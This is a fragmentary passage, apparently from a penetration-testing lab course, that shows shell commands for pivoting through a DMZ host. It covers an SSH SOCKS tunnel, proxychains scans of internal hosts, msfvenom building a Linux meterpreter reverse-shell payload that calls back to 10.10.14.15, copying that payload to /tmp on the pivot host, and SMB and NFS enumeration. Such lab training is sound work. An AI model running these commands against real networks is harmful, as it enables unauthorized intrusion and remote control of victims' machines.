...
```shell-session
[!bash!]$ ssh -D 8081 -i dmz01_key root@10.129.203.111
...
```shell-session
[!bash!]$ grep socks4 /etc/proxychains.conf 
...
```shell-session
[!bash!]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
...
```shell-session
[!bash!]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
...
```shell-session
[!bash!]$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
...
```shell-session
[!bash!]$ proxychains enum4linux -U -P 172.16.8.3
...
![Firefox connection settings showing manual proxy configuration with SOCKS Host set to 127.0.0.1, port 8081, and SOCKS v5 selected.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/ff_socks.png)

Browsing to the page confirms our suspicions.

![Web page for DNN installation with the message 'Every journey begins with the first step.' Offers options for using DNN in the cloud, on a server, or desktop. Features a logo with 'Open, Scalable, Extensible, Secure.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/dnn_homepage.png)
...
```shell-session
[!bash!]$ proxychains showmount -e 172.16.8.20
